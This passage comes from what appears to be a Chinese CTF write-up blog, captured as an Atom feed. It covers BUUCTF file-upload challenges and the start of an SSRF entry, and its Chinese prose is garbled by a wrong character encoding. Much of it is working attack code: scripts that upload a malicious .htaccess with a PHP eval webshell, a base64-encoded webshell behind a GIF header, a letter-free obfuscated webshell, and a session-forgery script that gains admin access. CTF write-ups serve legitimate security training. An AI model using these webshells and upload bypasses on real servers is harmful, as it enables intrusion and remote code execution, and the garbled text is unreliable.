class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .cc\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">        </span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">&quot;shell.cc&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[&#x27;shell&#x27;]); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8bf8acd4-49c6-40c6-9bfe-688945f733ac.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span></span><br><span class="line">payload = &#123;&#125;</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">htaccess_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line">shell_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;shell.cc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=htaccess_files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=shell_files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>éªŒè¯ä¸€ä¸‹</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163111.png" alt=""></p><p>ç”¨èšå‰‘è¿æ¥ï¼ŒåŠ è½½ç»•è¿‡<a href="https://github.com/Medicean/as_bypass_php_disable_functions">disable_functionçš„æ’ä»¶</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163432.png" alt=""></p><p>ç¬¬äºŒç§æ˜¯ç”¨base64ç¼–ç ç»•è¿‡</p><p>htaccessæ–‡ä»¶å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application&#x2F;x-httpd-php .cc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.cc&quot;</span><br></pre></td></tr></table></figure><p>shellçš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12 &#x2F;&#x2F; 12ä¸ºäº†æ»¡è¶³base64ç®—æ³•å‡‘è¶³å…«ä¸ªå­—èŠ‚</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pPz4&#x3D;  &#x2F;&#x2F;&lt;?php @eval($_POST[cmd])?&gt;çš„base64ç¼–ç </span><br></pre></td></tr></table></figure><h3 id="æ‹“å±•">æ‹“å±•</h3><p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">.htaccess trickæ€»ç»“</a></p><p><a href="https://dy.163.com/article/ECQSCP9E0511CJ6O.html">PHP7ç»•è¿‡open_basedir</a></p><h2 id="BSidesCF2019-SVGMagic">BSidesCF2019 SVGMagic</h2><h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3><ul><li><p>SVGæ–‡ä»¶æ ¼å¼</p></li><li><p>XXEè¯»å–æ–‡ä»¶</p></li></ul><h3 id="è§£é¢˜-v7">è§£é¢˜</h3><p>å…ˆæ¥çœ‹çœ‹ä»€ä¹ˆæ˜¯SVGã€‚</p><p>SVG æ„ä¸ºå¯ç¼©æ”¾çŸ¢é‡å›¾å½¢ï¼ˆScalable Vector Graphicsï¼‰ï¼Œ <strong>ä½¿ç”¨ XML æ ¼å¼å®šä¹‰å›¾åƒ</strong>ã€‚</p><p>çœ‹ä¸€ä¸ªå®ä¾‹</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205345.png" alt=""></p><p>ç”¨å¸¸è§„çš„XXEæ–‡ä»¶è¯»å–payload</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205431.png" alt=""></p><p>è¿™ä¸ªåœ°æ–¹æœ‰ä¸ªå‘å°±æ˜¯flagçš„æ–‡ä»¶ä½ç½®åœ¨å½“å‰ç›®å½•ï¼Œ<strong>è€Œ<code>proc/self/cwd</code>å°±ä»£è¡¨å½“å‰è·¯å¾„ã€‚</strong></p><h2 id="HFCTF2020-BabyUpload">HFCTF2020 BabyUpload</h2><h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3><ul><li><p>ä»£ç å®¡è®¡</p></li><li><p>sessionä¼ªé€ </p></li></ul><h3 id="è§£é¢˜-v8">è§£é¢˜</h3><p>å®¡è®¡æºç å¯ä»¥å‘ç°è¿™å‡ ä¸ªç‚¹</p><ul><li>sessionä¸­å­˜å‚¨äº†èº«ä»½ä¿¡æ¯ï¼Œé»˜è®¤äº‹guest</li><li>é€šè¿‡å‚æ•°å¯ä»¥ä¸Šä¼ æ–‡ä»¶å’Œä¸‹è½½æ–‡ä»¶</li></ul><p>æ—¢ç„¶è¿™æ ·ï¼Œé‚£æˆ‘ä»¬å°±å…ˆæŠŠsessionæ–‡ä»¶ä¸‹è½½ä¸‹æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819190549.png" alt=""></p><p>åº”è¯¥æ˜¯ç”¨php_binaryæ–¹å¼åºåˆ—åŒ–çš„sessionã€‚</p><p>é‚£ä¹ˆç°åœ¨çš„æ€è·¯å°±æ˜¯ï¼š</p><p>ä¼ªé€ admin session --&gt; ä¸Šä¼ æ–°çš„sessæ–‡ä»¶ --&gt; å°†cookieæ”¹æˆsessæ–‡ä»¶sha256åŠ å¯†åçš„å­—ç¬¦ä¸²</p><p>ä½†æ˜¯ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚æœç»•è¿‡å¯¹success.txtçš„åˆ¤æ–­ã€‚</p><p>ç”±äºæ–‡ä»¶åä¸å¯æ§ï¼Œæˆ‘ä»¬å°±æ— æ³•ä¸Šä¼ ä¸€ä¸ªåä¸ºsuccess.txtçš„æ–‡ä»¶ï¼Œä½†æ˜¯file_existså‡½æ•°çš„ä½œç”¨çš„æ˜¯<strong>æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨attråˆ›å»ºä¸€ä¸ªåä¸ºsuccess.txtçš„ç›®å½•å°±å¯ä»¥è¿‡è¿™ä¸ªåˆ¤æ–­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://0abaf9de-86a1-4b6e-ab78-f008f607f2d5.node3.buuoj.cn&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;sess&quot;</span>, BytesIO(<span class="string">b&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;download&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, data=data, files=files)</span><br><span class="line">    session_id = hashlib.sha256(<span class="string">&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> session_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_success</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;upload&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;success.txt&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;test&quot;</span>, BytesIO(<span class="string">b&#x27;good job!&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url, data=data, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload_success()</span><br><span class="line">php_session_id = admin()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: php_session_id</span><br><span class="line">&#125;</span><br><span class="line">s = requests.get(url)</span><br><span class="line">r = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-Avatar-Uploader-1">HarekazeCTF2019 Avatar Uploader 1</h2><h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3><ul><li>finfo_fileå‡½æ•°å’Œgetimagesizeå‡½æ•°çš„åŒºåˆ«</li></ul><h3 id="è§£é¢˜-v9">è§£é¢˜</h3><p>åŸé¢˜æ˜¯ç»™äº†æºç ã€‚</p><p>å…³é”®ä»£ç æ˜¯åœ¨upload.phpä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check file type</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">&#x27;image/png&#x27;</span>])) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded file is not PNG format.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded image is too large.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="string">&#x27;FLAG1&#x27;</span>) . <span class="string">&#x27;&lt;/code&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬å¾—äº†è§£PHPæ–‡ä»¶å¤´æ ¼å¼æ˜¯ä»€ä¹ˆæ ·çš„</p><p><a href="https://blog.csdn.net/u013943420/article/details/76855416">https://blog.csdn.net/u013943420/article/details/76855416</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113331.png" alt=""></p><p><code>89 50 4E 47 0D 0A 1A 0A</code> æ˜¯PNGå¤´éƒ¨ç½²ååŸŸï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªPNGå›¾ç‰‡<br><code>00 00 00 0D</code> æè¿°IHDRå¤´éƒ¨çš„å¤§å°<br><code>49 48 44 52</code> æ˜¯Chunk Type Code, è¿™é‡ŒChunk Type Code=IHDR</p><p>æ¥ä¸‹æ¥éœ€è¦äº†è§£finfo_fileå‡½æ•°å’Œgetimagesizeå‡½æ•°çš„åŒºåˆ«å°±åœ¨äºï¼š<code>FILEINFO</code> å¯ä»¥è¯†åˆ« png å›¾ç‰‡( åå…­è¿›åˆ¶ä¸‹ )çš„ç¬¬ä¸€è¡Œï¼Œè€Œ <code>getimagesize</code> ä¸å¯ä»¥ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113733.png" alt=""></p><h2 id="SUCTF-2019-getshell">SUCTF 2019 getshell</h2><h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3><ul><li>æ— æ•°å­—å­—æ¯webshell</li></ul><h3 id="è§£é¢˜-v10">è§£é¢˜</h3><p>å¯ç”¨å­—ç¬¦ï¼š<code>$().;=[]_~</code></p><p>å–åç»•è¿‡ï¼Œwebshellï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=~(ç);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(æŒŸ);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(æŒŸ);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(éš™);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(å¸);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(å‹‹);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line"></span><br><span class="line">$_=~(æ ¡);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(ä¸‹);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(çº¤);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(å«Œ);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$___=$$___;</span><br><span class="line">$__($___[_]);</span><br></pre></td></tr></table></figure><p>flagåœ¨envç¯å¢ƒå˜é‡ä¸­ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916134726.png" alt=""></p><h2 id="SUCTF-2019-Upload-Labs-2">SUCTF 2019 Upload Labs 2</h2><h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3><h3 id="è§£é¢˜-v11">è§£é¢˜</h3><p>admin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">&#x27;clazz&#x27;</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">&#x27;func1&#x27;</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">&#x27;func2&#x27;</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">&#x27;func3&#x27;</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">&#x27;arg1&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg3&#x27;</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You r not admin!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TODO">TODO</h3><h2 id="HarekazeCTF2019-Avatar-Uploader-2">HarekazeCTF2019 Avatar Uploader 2</h2><h3 id="TODO-v2">TODO</h3><h2 id="D3CTF-2019-EzUpload">D3CTF 2019 EzUpload</h2><h3 id="TODO-v3">TODO</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;æå®¢å¤§æŒ‘æˆ˜-2019-Upload&quot;&gt;æå®¢å¤§æŒ‘æˆ˜ 2019 Upload&lt;/h2&gt;
&lt;h3 id=&quot;è€ƒç‚¹&quot;&gt;è€ƒç‚¹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;phtmlç»•è¿‡åç¼€&lt;/li&gt;
&lt;li&gt;scriptç»•è¿‡&amp;lt;?&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;è§£é¢˜&quot;&gt;è§£é¢˜&lt;/h
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”SSRF</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF/</id>
    <published>2020-08-18T09:58:58.000Z</published>
    <updated>2020-08-18T12:24:47.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="De1CTF2019-SSRF-Me">De1CTF2019 SSRF Me</h2><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li>Pythonä»£ç å®¡è®¡</li><li>MD5æ‰©å±•æ”»å‡»</li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><p>é¦–å…ˆçœ‹ä¸‰ä¸ªè·¯ç”±ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure><ol><li>/ï¼šé¦–é¡µï¼Œè·å–æºç ï¼›</li><li>/geneSignï¼šä»ç”¨æˆ·è·å–<code>param</code>å‚æ•°ï¼Œå†ç»“åˆé¢„è®¾çš„<code>action='scan'</code>è°ƒç”¨<code>getSign</code>ç”Ÿæˆç­¾åï¼›</li><li>/De1taï¼šä»cookieä¸­è·å–<code>action</code>å’Œ<code>sign</code>ï¼Œå†è·å–<code>param</code>å‚æ•°ï¼Œç»“åˆå½“å‰IPåœ°å€æ„é€ ä¸€ä¸ªTaskç±»ï¼Œæœ€åä»¥jsonçš„æ ¼å¼è¿”å›<code>Exec</code>æ–¹æ³•æ‰§è¡Œç»“æœã€‚</li></ol><p>å†æ¥çœ‹getSignå‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 